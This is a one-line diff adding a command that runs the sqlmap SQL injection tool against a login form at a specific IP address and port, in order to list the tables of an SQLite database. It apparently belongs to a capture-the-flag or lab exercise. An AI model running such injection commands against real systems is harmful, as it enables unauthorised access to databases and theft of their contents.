@@ -1,0 +1,1 @@
+python sqlmap.py --dbms=sqlite3 -u http://34.16.207.52:3635/login --data "username=&password=" --tables
